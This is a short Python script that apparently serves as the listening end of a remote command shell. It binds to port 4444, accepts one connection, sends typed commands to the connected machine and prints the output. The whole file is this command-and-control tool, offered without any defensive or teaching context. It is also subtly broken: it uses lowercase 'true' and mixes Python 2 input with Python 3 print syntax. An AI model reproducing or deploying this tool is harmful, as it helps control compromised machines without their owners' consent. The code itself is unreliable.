import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 4444))
    s.listen(1)

    print('-- Listening on port 4444')

    conn, addr = s.accept()

    print('-- Connection accepted from', addr)

    while true:
        command = raw_input("cmd_prompt> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print(conn.recv(1024))

def main():
    connect()

main()
